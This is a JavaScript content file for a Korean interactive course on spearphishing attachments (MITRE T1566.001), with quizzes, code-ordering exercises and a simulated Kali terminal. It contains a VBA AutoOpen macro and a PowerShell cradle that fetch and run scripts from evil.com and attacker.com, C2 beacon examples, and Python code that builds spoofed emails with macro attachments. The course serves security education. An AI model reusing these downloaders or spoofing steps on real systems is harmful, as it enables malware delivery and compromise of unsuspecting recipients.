/**
 * T1566.001 — Spearphishing Attachment
 * 일본식 유도 학습법 14챕터 콘텐츠
 * 주제: 피싱의 해부학 — 첨부파일 기반 공격의 모든 것
 */

export const CHAPTER_META = {
  techniqueId: 'T1566.001',
  title: '피싱의 해부학',
  subtitle: 'Spearphishing Attachment — 첨부파일 기반 공격의 모든 것',
  totalChapters: 14,
};

export const CHAPTERS = [
  // ════════════════════════════════════════════════════════
  // 챕터 1: 피싱 도구의 세계
  // ════════════════════════════════════════════════════════
  {
    id: 1,
    title: '피싱 도구의 세계 — GoPhish와 친구들',
    subtitle: 'Tool Introduction & Principles',
    guidedQuestion: '만약 당신이 공격자라면, 이메일 하나로 무엇을 할 수 있을까요?',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '이메일, 가장 오래된 공격 벡터' },
            { type: 'paragraph', text: '매일 전 세계에서 약 **34억 통**의 피싱 이메일이 발송됩니다. 2023년 기준 사이버 공격의 **91%**가 이메일에서 시작되었으며, 이는 피싱이 여전히 가장 효과적인 초기 접근(Initial Access) 수단임을 의미합니다.' },
            { type: 'paragraph', text: '그렇다면 공격자는 어떤 도구로 이 이메일을 만들고, 어떻게 타겟에게 전달할까요? 이번 챕터에서는 실제 모의 침투 테스트에서 사용되는 **오픈소스 피싱 도구**들을 하나씩 살펴보겠습니다.' },
            { type: 'callout', variant: 'warning', text: '이 콘텐츠는 **교육 및 방어 목적**으로만 제공됩니다. 실제 공격에 사용하는 것은 법적 처벌 대상입니다.' },

            { type: 'heading', text: '대표 도구 ① GoPhish' },
            { type: 'paragraph', text: '`GoPhish`는 가장 널리 사용되는 오픈소스 피싱 시뮬레이션 프레임워크입니다. Go 언어로 작성되었으며, 웹 UI를 통해 캠페인을 생성하고 결과를 추적합니다.' },
            { type: 'toggle', label: 'GoPhish 주요 기능 보기', text: '• 이메일 템플릿 편집기 (HTML/텍스트)\n• 랜딩 페이지 클론 기능\n• 대상 그룹 관리 (CSV 임포트)\n• 실시간 대시보드 (열람률/클릭률/입력률)\n• SMTP 발송 프로필 설정\n• API 기반 자동화 지원 (REST API)' },
            { type: 'code', label: 'GoPhish 설치 (Docker)', text: 'docker pull gophish/gophish\ndocker run -d --name gophish \\\n  -p 3333:3333 -p 8080:8080 \\\n  gophish/gophish' },

            { type: 'heading', text: '대표 도구 ② King Phisher' },
            { type: 'paragraph', text: '`King Phisher`는 Python 기반의 피싱 캠페인 도구로, 서버-클라이언트 아키텍처를 사용합니다. GoPhish보다 커스터마이징이 자유롭지만, 설정이 더 복잡합니다.' },
            { type: 'comparison', items: [
              { label: 'GoPhish', text: '✅ 설치 쉬움\n✅ 웹 UI\n⚠️ 커스텀 제한적' },
              { label: 'King Phisher', text: '⚠️ 설치 복잡\n✅ 높은 자유도\n✅ Jinja2 템플릿' },
            ]},

            { type: 'heading', text: '대표 도구 ③ SET (Social-Engineer Toolkit)' },
            { type: 'paragraph', text: '`SET`은 TrustedSec에서 개발한 소셜 엔지니어링 전문 프레임워크입니다. Kali Linux에 기본 포함되어 있으며, 피싱 외에도 USB 드롭, QR 코드 공격 등 다양한 소셜 엔지니어링 기법을 지원합니다.' },
            { type: 'code', label: 'SET 실행', text: 'sudo setoolkit\n\n# 메뉴 선택:\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors  \n# 3) Credential Harvester Attack Method\n# 4) Site Cloner' },

            { type: 'heading', text: '피싱 도구의 공통 구조' },
            { type: 'paragraph', text: '이 세 도구는 표면적으로 다르지만, 핵심 동작 원리는 동일합니다:' },

            { type: 'hint', label: '💡 잠깐, 스스로 생각해보세요', text: '피싱 도구가 동작하려면 최소한 어떤 요소가 필요할까요? (힌트: 발송, 수신, 추적)' },
          ]
        }
      },
      {
        type: 'animation',
        config: {
          title: '피싱 캠페인의 5단계 흐름',
          steps: [
            { emoji: '📧', label: '1단계: 이메일 작성', description: '공격자는 신뢰할 수 있는 발신자를 사칭하여 이메일 템플릿을 작성합니다. HTML을 사용하여 실제 기업 메일과 구분이 어렵게 만듭니다.', detail: 'From: security@company-update.com\nSubject: [긴급] 비밀번호 변경 요청' },
            { emoji: '📎', label: '2단계: 페이로드 첨부', description: '악성 매크로가 포함된 문서(.docm), 또는 이중 확장자 파일(.pdf.exe)을 첨부합니다. T1566.001의 핵심은 바로 이 첨부파일입니다.', detail: 'Invoice_Q4_2024.docm (매크로 포함)\n→ AutoOpen() 매크로가 PowerShell 실행' },
            { emoji: '📤', label: '3단계: SMTP 발송', description: '공격자의 SMTP 서버 또는 탈취한 메일 계정을 통해 대량 또는 표적 발송합니다. SPF/DKIM 우회를 위해 유사 도메인을 사용하기도 합니다.', detail: 'SMTP: mail.company-update.com:587\nSPF: v=spf1 include:_spf.google.com ~all' },
            { emoji: '👆', label: '4단계: 피해자 실행', description: '피해자가 첨부파일을 열면 매크로가 실행되고, C2 서버와의 역방향 연결(Reverse Shell)이 수립됩니다.', detail: 'Sub AutoOpen()\n  Shell("powershell -enc BASE64...")\nEnd Sub' },
            { emoji: '📊', label: '5단계: 결과 추적', description: '공격자는 대시보드에서 이메일 열람, 링크 클릭, 첨부파일 실행, 자격 증명 입력 등을 실시간으로 모니터링합니다.', detail: 'Stats: 200 sent → 45 opened → 12 clicked → 3 executed' },
          ],
        }
      },
      {
        type: 'quiz',
        questions: [
          {
            question: 'T1566.001에서 "001"이 의미하는 서브테크닉은?',
            options: ['Spearphishing Link (링크)', 'Spearphishing Attachment (첨부파일)', 'Spearphishing via Service (서비스)', 'Phishing for Information (정보 수집)'],
            correct: 1,
            explanation: 'T1566.001은 Spearphishing Attachment — 악성 첨부파일을 이용한 표적 피싱입니다. .002는 링크, .003은 서비스, .004는 정보 수집용 피싱입니다.'
          },
          {
            question: 'GoPhish의 주요 용도는?',
            options: ['네트워크 스캐닝', '피싱 시뮬레이션 및 캠페인 관리', '취약점 스캐닝', '패스워드 크래킹'],
            correct: 1,
            explanation: 'GoPhish는 조직 내 보안 인식 교육을 위한 피싱 시뮬레이션 프레임워크입니다. 실제 공격이 아닌 방어 훈련 목적으로 설계되었습니다.'
          },
          {
            question: '피싱 이메일에서 가장 흔히 사용되는 첨부파일 형식은?',
            options: ['.jpg 이미지', '.docm / .xlsm (매크로 문서)', '.mp3 오디오', '.txt 텍스트'],
            correct: 1,
            explanation: '.docm(Word 매크로)과 .xlsm(Excel 매크로) 파일은 AutoOpen 매크로를 통해 코드를 자동 실행할 수 있어 피싱 첨부파일로 가장 많이 사용됩니다.'
          },
        ]
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 2: 이메일의 속살 — SMTP/SPF/DKIM
  // ════════════════════════════════════════════════════════
  {
    id: 2,
    title: '이메일의 속살 — SMTP, SPF, DKIM의 원리',
    subtitle: 'Under the Hood: Email Protocol Deep Dive',
    guidedQuestion: '이메일이 "진짜"인지, 우리는 어떻게 판별할 수 있을까요?',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '이메일은 어떻게 전달되는가?' },
            { type: 'paragraph', text: '챕터 1에서 GoPhish가 이메일을 보내는 것을 보았습니다. 그런데 이 이메일은 정확히 **어떤 과정**을 거쳐 피해자의 받은 편지함에 도착할까요? 이것을 이해해야 공격과 방어 모두 가능합니다.' },
            { type: 'paragraph', text: 'SMTP(Simple Mail Transfer Protocol)는 1982년에 만들어진 프로토콜입니다. 놀랍게도 **발신자 인증 기능이 없습니다.** 누구나 `From:` 헤더에 원하는 주소를 넣을 수 있다는 뜻입니다.' },
            { type: 'callout', variant: 'tip', text: '이것이 피싱이 가능한 근본 원인입니다 — SMTP는 설계 단계부터 **신뢰 기반** 프로토콜이었습니다.' },

            { type: 'heading', text: 'SMTP 통신 과정 (Raw)' },
            { type: 'code', label: 'SMTP 세션 예시 (telnet)', text: 'HELO attacker.com\nMAIL FROM:<ceo@legit-company.com>    ← 위조 가능!\nRCPT TO:<victim@target.com>\nDATA\nFrom: CEO <ceo@legit-company.com>\nTo: victim@target.com\nSubject: [긴급] 첨부 문서 확인 요청\n\n첨부된 문서를 확인해주세요.\n.\nQUIT' },
            { type: 'paragraph', text: '위 예시에서 `MAIL FROM`은 실제 발신자와 무관하게 아무 주소나 넣을 수 있습니다. 이것을 **이메일 스푸핑(Email Spoofing)**이라고 합니다.' },

            { type: 'heading', text: '방어 메커니즘 ① SPF (Sender Policy Framework)' },
            { type: 'paragraph', text: '`SPF`는 도메인 소유자가 "이 IP만 내 도메인으로 메일을 보낼 수 있다"고 DNS에 선언하는 방식입니다.' },
            { type: 'code', label: 'SPF 레코드 예시', text: 'legit-company.com.  TXT  "v=spf1 ip4:203.0.113.5 include:_spf.google.com -all"\n\n해석:\n  ip4:203.0.113.5     → 이 IP만 허용\n  include:google.com  → Gmail 서버도 허용\n  -all                → 나머지는 전부 차단 (Hard Fail)' },
            { type: 'hint', label: '생각해보세요: SPF의 한계는?', text: 'SPF는 `MAIL FROM` (봉투 발신자)만 검사합니다. 사용자가 실제로 보는 `From:` 헤더는 검사하지 않습니다! 공격자는 봉투와 헤더를 다르게 설정할 수 있습니다.' },

            { type: 'heading', text: '방어 메커니즘 ② DKIM (DomainKeys Identified Mail)' },
            { type: 'paragraph', text: '`DKIM`은 이메일 본문과 헤더에 **전자 서명**을 추가합니다. 수신 서버는 DNS에서 공개 키를 가져와 서명을 검증합니다.' },
            { type: 'code', label: 'DKIM 서명 헤더', text: 'DKIM-Signature: v=1; a=rsa-sha256; d=legit-company.com;\n  s=google; h=from:to:subject:date;\n  b=BASE64_SIGNATURE_HERE...\n\n→ d=legit-company.com 도메인의 google 셀렉터로\n→ from, to, subject, date 헤더를 서명' },

            { type: 'heading', text: '방어 메커니즘 ③ DMARC' },
            { type: 'paragraph', text: '`DMARC`는 SPF와 DKIM을 종합하여 "둘 다 실패하면 어떻게 처리할지"를 정의합니다. `p=reject`이면 메일을 아예 차단하고, `p=quarantine`이면 스팸함으로 보냅니다.' },
            { type: 'code', label: 'DMARC 레코드', text: '_dmarc.legit-company.com.  TXT  "v=DMARC1; p=reject; rua=mailto:dmarc@legit-company.com"' },
          ]
        }
      },
      {
        type: 'code-sketch',
        config: {
          title: '이메일 헤더 분석 순서 맞추기',
          description: '수신된 이메일의 위조 여부를 분석하는 올바른 순서를 조립하세요.',
          language: 'analysis',
          palette: [
            { id: 'step1', code: '1. Received 헤더에서 실제 발송 IP 확인' },
            { id: 'step2', code: '2. MAIL FROM과 From 헤더 불일치 확인' },
            { id: 'step3', code: '3. SPF 결과 확인 (Pass/Fail/Softfail)' },
            { id: 'step4', code: '4. DKIM 서명 검증 (d= 도메인 확인)' },
            { id: 'step5', code: '5. DMARC 정책 결과 확인 (Pass/Fail)' },
            { id: 'step6', code: '6. 종합 판단: 스푸핑 여부 결론' },
          ],
          correctOrder: ['step1', 'step2', 'step3', 'step4', 'step5', 'step6'],
          expectedOutput: '✅ 분석 완료!\n\n[결과]\nReceived: 45.33.32.156 (공격자 IP)\nMAIL FROM: attacker@evil.com ≠ From: ceo@legit.com\nSPF: FAIL (IP 미등록)\nDKIM: FAIL (서명 없음)\nDMARC: FAIL (p=reject)\n\n→ 판정: 🚨 스푸핑 이메일 (차단 대상)',
        }
      },
      {
        type: 'quiz',
        questions: [
          {
            question: 'SPF가 검사하는 대상은?',
            options: ['From: 헤더 (사용자가 보는 발신자)', 'MAIL FROM (봉투 발신자, envelope sender)', '이메일 본문 내용', '첨부파일 해시'],
            correct: 1,
            explanation: 'SPF는 SMTP 봉투(envelope)의 MAIL FROM만 검사합니다. 사용자에게 표시되는 From: 헤더는 별도로 DMARC alignment을 통해 확인됩니다.'
          },
          {
            question: 'DMARC의 p=reject는 어떤 의미인가요?',
            options: ['이메일을 스팸함으로 보냄', '이메일을 아예 수신 거부함', '발신자에게 경고 이메일 전송', '로그만 기록하고 통과시킴'],
            correct: 1,
            explanation: 'p=reject는 SPF와 DKIM 모두 실패한 이메일을 수신 서버가 아예 거부하도록 지시합니다. 가장 강력한 DMARC 정책입니다.'
          },
        ]
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 3: T1566.001 해부 — 첨부파일 공격 체인
  // ════════════════════════════════════════════════════════
  {
    id: 3,
    title: 'T1566.001 해부 — 첨부파일 공격 체인',
    subtitle: 'Attack Chain: From Email to Shell',
    guidedQuestion: '첨부파일을 열면 그 순간 무슨 일이 일어날까요?',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '챕터 2에서 이어서...' },
            { type: 'paragraph', text: '이제 이메일이 어떻게 전달되는지 알았습니다. 그런데 SMTP 프로토콜을 아는 것만으로는 실제 공격을 이해하기 어렵습니다. T1566.001의 핵심은 **첨부파일이 실행되는 순간** 발생하는 일련의 체인 반응입니다.' },
            { type: 'paragraph', text: '이번 챕터에서는 피해자가 첨부파일을 더블클릭하는 순간부터 공격자의 C2 서버에 연결되기까지의 **전체 킬 체인(Kill Chain)**을 한 단계씩 해부합니다.' },

            { type: 'heading', text: '공격 벡터: 악성 매크로 문서' },
            { type: 'paragraph', text: '가장 흔한 T1566.001 페이로드는 **VBA 매크로가 삽입된 Office 문서**(.docm, .xlsm)입니다. Word/Excel이 파일을 열 때 `AutoOpen()` 또는 `Workbook_Open()` 매크로가 자동 실행됩니다.' },
            { type: 'code', label: '악성 매크로 구조 (VBA)', text: 'Sub AutoOpen()\n    \' 1단계: PowerShell 다운로더 실행\n    Dim cmd As String\n    cmd = "powershell -WindowStyle Hidden -Exec Bypass " & _\n          "-Command ""IEX(New-Object Net.WebClient)." & _\n          "DownloadString(\'http://evil.com/stage2.ps1\')"""\n    Shell cmd, vbHide\nEnd Sub' },

            { type: 'heading', text: '그 외 첨부파일 유형' },
            { type: 'toggle', label: '다른 페이로드 유형 보기', text: '• **.lnk (바로가기)**: cmd.exe/powershell.exe를 가리키는 바로가기 파일\n• **.iso / .img**: 디스크 이미지 안에 실행파일 숨기기 (MOTW 우회)\n• **.html (HTML Smuggling)**: HTML 안에 Base64로 인코딩된 실행파일\n• **.one (OneNote)**: 내장 스크립트 실행 가능 (2023년 급증)\n• **.zip + 패스워드**: AV 스캔 우회를 위한 암호화 압축' },

            { type: 'callout', variant: 'info', text: 'MITRE ATT&CK에서 T1566.001은 **Initial Access** 전술에 속합니다. 공격의 시작점이지만, 실제 피해는 이후 단계(Execution → Persistence → C2)에서 발생합니다.' },
          ]
        }
      },
      {
        type: 'animation',
        config: {
          title: 'T1566.001 킬 체인 — 첨부파일 실행부터 C2 연결까지',
          intervalMs: 4000,
          steps: [
            { emoji: '📎', label: '피해자가 첨부파일 열기', description: 'Invoice_2024.docm을 더블클릭합니다. Word가 실행되며 "매크로 사용" 경고가 표시됩니다.', detail: 'WINWORD.EXE → "콘텐츠 사용" 버튼 클릭' },
            { emoji: '⚡', label: 'AutoOpen() 매크로 실행', description: 'VBA 매크로가 자동으로 실행되어 PowerShell 프로세스를 생성합니다.', detail: 'Sub AutoOpen()\n  Shell("powershell -enc JABX...")\nEnd Sub' },
            { emoji: '🌐', label: 'Stage 2 다운로드', description: 'PowerShell이 공격자의 서버에서 2차 페이로드를 다운로드합니다.', detail: 'IEX(New-Object Net.WebClient).\nDownloadString("http://evil.com/stage2.ps1")' },
            { emoji: '💉', label: '메모리 인젝션', description: '다운로드된 스크립트가 정상 프로세스(svchost.exe)에 셸코드를 주입합니다.', detail: '[Inject]::IntoProcess("svchost.exe", $shellcode)\n→ 디스크에 파일을 쓰지 않아 AV 탐지 어려움' },
            { emoji: '🔗', label: 'C2 비컨 수립', description: '감염된 프로세스가 C2 서버와 HTTPS 비컨 통신을 시작합니다. 공격자는 이제 원격 제어가 가능합니다.', detail: 'Beacon → https://c2.evil.com:443/api/beacon\n간격: 60초마다 체크인\n→ 공격자: 명령 실행, 파일 다운로드, 횡이동' },
          ],
        }
      },
      {
        type: 'quiz',
        questions: [
          {
            question: 'VBA 매크로에서 파일을 열 때 자동 실행되는 함수 이름은?',
            options: ['Main()', 'AutoOpen() 또는 Workbook_Open()', 'Init()', 'OnLoad()'],
            correct: 1,
            explanation: 'Word는 AutoOpen(), Excel은 Workbook_Open()이 문서를 열 때 자동으로 실행됩니다. 이것이 매크로 기반 공격의 핵심 진입점입니다.'
          },
          {
            question: 'Stage 2 페이로드를 "메모리에서만" 실행하는 이유는?',
            options: ['실행 속도가 빨라서', '디스크에 파일을 남기지 않아 안티바이러스 탐지를 회피하기 위해', '메모리가 더 안전해서', '디스크 공간이 부족해서'],
            correct: 1,
            explanation: '파일리스(Fileless) 기법은 디스크에 악성 파일을 생성하지 않아 서명 기반 안티바이러스의 파일 스캔을 우회합니다. 메모리 분석(Memory Forensics)이 필요한 이유입니다.'
          },
        ]
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 4: 복습 + 코드 스케치
  // ════════════════════════════════════════════════════════
  {
    id: 4,
    title: '쉬어가며 복습 — 코드로 되짚기',
    subtitle: 'Review & Interactive Code Sketch',
    guidedQuestion: '지금까지 배운 것을 코드로 조립해볼까요?',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '챕터 1~3 핵심 요약' },
            { type: 'paragraph', text: '여기까지 오느라 수고했습니다! 지금까지 우리는 세 가지 핵심을 배웠습니다:' },
            { type: 'comparison', items: [
              { label: 'Ch.1 — 도구', text: 'GoPhish, King Phisher, SET 등 피싱 시뮬레이션 도구의 역할과 공통 구조' },
              { label: 'Ch.2 — 프로토콜', text: 'SMTP 위조 가능성, SPF/DKIM/DMARC 3단계 방어 메커니즘' },
            ]},
            { type: 'comparison', items: [
              { label: 'Ch.3 — 공격 체인', text: '첨부파일 → 매크로 → PowerShell → 메모리 인젝션 → C2 비컨' },
              { label: '핵심 용어', text: 'Spearphishing, Email Spoofing, VBA Macro, Fileless, Kill Chain' },
            ]},
            { type: 'callout', variant: 'tip', text: '이번 챕터는 쉬어가는 개념입니다. 코드의 **표면적인 구조**만 이해하면 됩니다. 내장 함수의 깊은 구현까지 알 필요는 없습니다.' },

            { type: 'heading', text: 'VBA 매크로 코드 해석' },
            { type: 'paragraph', text: '챕터 3에서 본 매크로를 줄별로 해석해봅시다:' },
            { type: 'code', label: '매크로 줄별 해석', text: 'Sub AutoOpen()              \' 문서 열 때 자동 실행\n    Dim cmd As String       \' 문자열 변수 선언\n    cmd = "powershell ..."  \' 실행할 명령어 조합\n    Shell cmd, vbHide       \' 명령어 실행 (숨김 모드)\nEnd Sub                     \' 함수 종료' },
            { type: 'paragraph', text: '핵심은 `Shell` 함수입니다. 이 함수는 Windows 시스템 명령어를 실행합니다. `vbHide`는 창을 숨기라는 의미로, 피해자가 눈치채지 못하게 합니다.' },
          ]
        }
      },
      {
        type: 'code-sketch',
        config: {
          title: 'VBA 매크로 구조 조립하기',
          description: '피싱 문서의 매크로 코드를 올바른 순서로 조립하세요. 각 블록의 역할을 생각하며 배치해보세요.',
          language: 'vba',
          palette: [
            { id: 'sub', code: 'Sub AutoOpen()' },
            { id: 'dim', code: '    Dim cmd As String' },
            { id: 'set', code: '    cmd = "powershell -WindowStyle Hidden -Exec Bypass ..."' },
            { id: 'exec', code: '    Shell cmd, vbHide' },
            { id: 'end', code: 'End Sub' },
          ],
          correctOrder: ['sub', 'dim', 'set', 'exec', 'end'],
          expectedOutput: '✅ 매크로 구조 완성!\n\n[동작 순서]\n1. AutoOpen() → 문서 열 때 자동 호출\n2. cmd 변수에 PowerShell 명령 저장\n3. Shell()로 숨김 모드 실행\n4. PowerShell이 2차 페이로드 다운로드\n\n→ 이것이 T1566.001 공격의 시작점입니다.',
        }
      },
      {
        type: 'code-sketch',
        config: {
          title: 'PowerShell 다운로더 스크립트 조립',
          description: '매크로가 실행하는 PowerShell 다운로더 스크립트를 조립하세요.',
          language: 'powershell',
          palette: [
            { id: 'obj', code: '$client = New-Object System.Net.WebClient' },
            { id: 'url', code: '$url = "http://attacker.com/payload.ps1"' },
            { id: 'down', code: '$script = $client.DownloadString($url)' },
            { id: 'exec', code: 'Invoke-Expression $script' },
          ],
          correctOrder: ['obj', 'url', 'down', 'exec'],
          expectedOutput: '✅ 다운로더 완성!\n\n[실행 흐름]\n1. WebClient 객체 생성\n2. 공격자 서버 URL 지정\n3. 원격 스크립트를 문자열로 다운로드\n4. IEX(Invoke-Expression)로 메모리 실행\n\n→ 디스크에 파일을 쓰지 않는 "파일리스" 기법!',
        }
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 5: 나만의 피싱 도구 만들기
  // ════════════════════════════════════════════════════════
  {
    id: 5,
    title: '나만의 피싱 시뮬레이터 만들기',
    subtitle: 'Build Your Own Tool',
    guidedQuestion: '직접 만들면 원리가 보인다 — 간단한 이메일 생성기를 조립해봅시다.',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '왜 직접 만들어야 할까?' },
            { type: 'paragraph', text: '챕터 1~4에서 상용 도구와 코드 구조를 배웠습니다. 하지만 "사용법"을 아는 것과 "원리를 이해하는 것"은 다릅니다. 이번 챕터에서는 **아주 간단한 피싱 이메일 생성기**를 직접 조립해봅니다.' },
            { type: 'callout', variant: 'warning', text: '이 도구는 교육 목적의 시뮬레이터입니다. 실제 발송 기능은 없으며, 이메일 구조를 이해하기 위한 것입니다.' },
            { type: 'paragraph', text: 'Python의 `smtplib`와 `email` 모듈을 사용하면 이메일의 핵심 구조를 직접 다룰 수 있습니다. 아래 코드 블록들을 올바른 순서로 조립해보세요.' },
          ]
        }
      },
      {
        type: 'code-sketch',
        config: {
          title: '피싱 이메일 생성기 조립',
          description: 'Python으로 이메일 메시지 객체를 생성하는 코드를 순서대로 조립하세요.',
          language: 'python',
          palette: [
            { id: 'import', code: 'from email.mime.multipart import MIMEMultipart' },
            { id: 'import2', code: 'from email.mime.text import MIMEText' },
            { id: 'create', code: 'msg = MIMEMultipart()' },
            { id: 'from', code: 'msg["From"] = "security@company-update.com"' },
            { id: 'to', code: 'msg["To"] = target_email' },
            { id: 'subject', code: 'msg["Subject"] = "[긴급] 보안 패치 적용 요청"' },
            { id: 'body', code: 'body = MIMEText(html_content, "html")' },
            { id: 'attach', code: 'msg.attach(body)' },
          ],
          correctOrder: ['import', 'import2', 'create', 'from', 'to', 'subject', 'body', 'attach'],
          expectedOutput: '✅ 이메일 생성기 완성!\n\n[생성된 이메일 구조]\nFrom: security@company-update.com\nTo: victim@target.com\nSubject: [긴급] 보안 패치 적용 요청\nContent-Type: multipart/mixed\n\n→ 아직 발송은 하지 않았습니다.\n→ 다음 챕터에서 모의 환경으로 테스트합니다.',
        }
      },
      {
        type: 'code-sketch',
        config: {
          title: '악성 첨부파일 생성기 조립',
          description: '이메일에 첨부할 파일을 추가하는 코드를 조립하세요.',
          language: 'python',
          palette: [
            { id: 'imp', code: 'from email.mime.base import MIMEBase' },
            { id: 'imp2', code: 'from email import encoders' },
            { id: 'open', code: 'with open("report.docm", "rb") as f:' },
            { id: 'read', code: '    attachment = MIMEBase("application", "octet-stream")' },
            { id: 'payload', code: '    attachment.set_payload(f.read())' },
            { id: 'encode', code: 'encoders.encode_base64(attachment)' },
            { id: 'header', code: 'attachment.add_header("Content-Disposition", "attachment", filename="report.docm")' },
            { id: 'add', code: 'msg.attach(attachment)' },
          ],
          correctOrder: ['imp', 'imp2', 'open', 'read', 'payload', 'encode', 'header', 'add'],
          expectedOutput: '✅ 첨부파일 추가 완성!\n\n[첨부파일 정보]\nFilename: report.docm\nEncoding: Base64\nContent-Type: application/octet-stream\n\n→ 이 파일은 Ch.3에서 배운 VBA 매크로가\n   포함된 Word 문서입니다.\n→ Ch.6에서 모의 환경으로 테스트합니다.',
        }
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 6: 모의 환경 공격 실습
  // ════════════════════════════════════════════════════════
  {
    id: 6,
    title: '모의 환경 공격 실습',
    subtitle: 'Attack Simulation in Sandbox',
    guidedQuestion: '내가 만든 도구가 실제로 동작할까요?',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '시뮬레이션 환경 안내' },
            { type: 'paragraph', text: '챕터 5에서 이메일 생성기와 첨부파일 추가기를 만들었습니다. 이제 **가상의 모의 환경**에서 이 도구를 사용해봅시다. 아래 터미널은 시뮬레이션이며, 실제 네트워크에 영향을 주지 않습니다.' },
            { type: 'callout', variant: 'info', text: '이 터미널은 교육용 시뮬레이터입니다. 미리 정의된 명령어만 실행할 수 있으며, 실제 시스템에 접근하지 않습니다.' },
          ]
        }
      },
      {
        type: 'terminal',
        config: {
          title: 'Kali Linux — 피싱 캠페인 시뮬레이션',
          prompt: 'attacker@kali:~/phishing$',
          scenario: [
            {
              instruction: 'SMTP 서버 연결을 테스트하세요: smtp-test connect mail.target.com',
              expectedCmd: 'smtp-test connect mail.target.com',
              output: '🔌 Connecting to mail.target.com:587...\n✅ Connection established!\nServer: Postfix (Ubuntu)\nSTARTTLS: Supported\nAuth: LOGIN, PLAIN',
            },
            {
              instruction: '대상 도메인의 SPF 레코드를 확인하세요: dig txt target.com',
              expectedCmd: 'dig txt target.com',
              output: '; <<>> DiG 9.18.12 <<>> txt target.com\n;; ANSWER SECTION:\ntarget.com.  300  IN  TXT  "v=spf1 include:_spf.google.com ~all"\n\n⚠️ SPF가 ~all (Soft Fail) — 스푸핑 가능성 있음!',
            },
            {
              instruction: '이메일 생성기를 실행하세요: python3 phish_gen.py --target victim@target.com',
              expectedCmd: 'python3 phish_gen.py --target victim@target.com',
              output: '📧 Email Generator v1.0\n─────────────────────\nFrom: security@target-update.com\nTo: victim@target.com\nSubject: [긴급] 보안 패치 적용 요청\nAttachment: report.docm (45KB)\n\n✅ Email object created successfully!\n⚠️ [SIM] 실제 발송하지 않음 (시뮬레이션 모드)',
            },
            {
              instruction: '피해자의 메일함 상태를 확인하세요: sim-check inbox victim@target.com',
              expectedCmd: 'sim-check inbox victim@target.com',
              output: '📬 Simulated Inbox — victim@target.com\n─────────────────────────────────────\n[1] ✉️ [긴급] 보안 패치 적용 요청\n    From: security@target-update.com\n    📎 report.docm (45KB)\n    SPF: SoftFail ⚠️ | DKIM: None ❌\n    Status: DELIVERED (스팸 필터 통과)\n\n→ SPF ~all이어서 Soft Fail이지만 차단되지 않았습니다.',
            },
            {
              instruction: '피해자가 첨부파일을 여는 시뮬레이션: sim-execute report.docm',
              expectedCmd: 'sim-execute report.docm',
              output: '▶️ Simulating document open...\n[WINWORD.EXE] report.docm 열림\n[!] 매크로 경고: "콘텐츠 사용" 클릭됨\n[VBA] AutoOpen() 실행 중...\n[PS] powershell.exe -WindowStyle Hidden 실행\n[NET] http://evil-sim.local/stage2.ps1 다운로드\n[INJ] svchost.exe에 셸코드 인젝션\n[C2] https://c2-sim.local:443 비컨 수립\n\n🔴 시뮬레이션 완료: 공격 성공 (전체 킬체인 실행)\n\n📋 MITRE ATT&CK 매핑:\n  T1566.001 → Initial Access (피싱 첨부파일)\n  T1059.001 → Execution (PowerShell)\n  T1055     → Defense Evasion (프로세스 인젝션)\n  T1071.001 → C2 (HTTPS 비컨)',
            },
          ],
        }
      },
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'callout', variant: 'tip', text: '방금 체험한 시뮬레이션은 실제 APT 그룹이 사용하는 킬체인과 동일한 흐름입니다. SPF가 `~all`(Soft Fail)로 설정된 도메인은 스푸핑에 취약합니다. `-all`(Hard Fail)로 변경해야 합니다.' },
          ]
        }
      },
    ],
  },

  // ════════════════════════════════════════════════════════
  // 챕터 7: 내 도구 해부하기
  // ════════════════════════════════════════════════════════
  {
    id: 7,
    title: '내 도구 해부하기',
    subtitle: 'Tool Dissection: How It Works Inside',
    guidedQuestion: '내가 만든 것이 정확히 어떻게 작동했을까요?',
    sections: [
      {
        type: 'text',
        content: {
          blocks: [
            { type: 'heading', text: '챕터 6에서 이어서...' },
            { type: 'paragraph', text: '모의 환경에서 우리 도구가 성공적으로 동작하는 것을 확인했습니다. 이제 한 발 물러서서, 각 단계가 **왜** 그리고 **어떻게** 동작했는지 뜯어봅시다.' },

            { type: 'heading', text: '① SMTP 통신 — 발송 과정' },
            { type: 'paragraph', text: '우리 도구의 이메일 발송 부분을 분해해보겠습니다. Python의 `smtplib`는 내부적으로 TCP 소켓을 열고, SMTP 프로토콜 명령어를 순차적으로 전송합니다.' },
            { type: 'code', label: 'smtplib 내부 동작', text: '# 실제 smtplib가 하는 일:\n1. socket.connect((host, 587))     # TCP 연결\n2. EHLO attacker.com               # 인사 (capabilities 교환)\n3. STARTTLS                         # TLS 암호화 시작\n4. AUTH LOGIN base64(user:pass)     # 인증\n5. MAIL FROM:<spoofed@addr>         # 발신자 (위조 가능)\n6. RCPT TO:<victim@target>          # 수신자\n7. DATA + 이메일 본문               # 이메일 전송\n8. QUIT                             # 연결 종료' },

            { type: 'heading', text: '② Base64 인코딩 — 첨부파일 전송' },
            { type: 'paragraph', text: '이메일은 원래 텍스트 전용 프로토콜입니다. 바이너리 파일(문서, 이미지)을 전송하려면 **Base64로 인코딩**하여 텍스트로 변환해야 합니다.' },
            { type: 'code', label: 'Base64 인코딩 예시', text: '원본 (16진수): 4D 5A 90 00 (PE 실행파일 시그니처)\nBase64 변환:   TVqQAA==\n\n→ 바이너리를 ASCII 문자로 변환\n→ 약 33% 크기 증가\n→ 이메일 본문에 안전하게 삽입 가능' },

            { type: 'heading', text: '③ VBA → PowerShell 브리지' },
            { type: 'paragraph', text: '매크로가 PowerShell을 실행하는 `Shell` 함수는 Windows API의 `CreateProcess`를 호출합니다. 이것이 **프로세스 체인**의 시작점입니다:' },
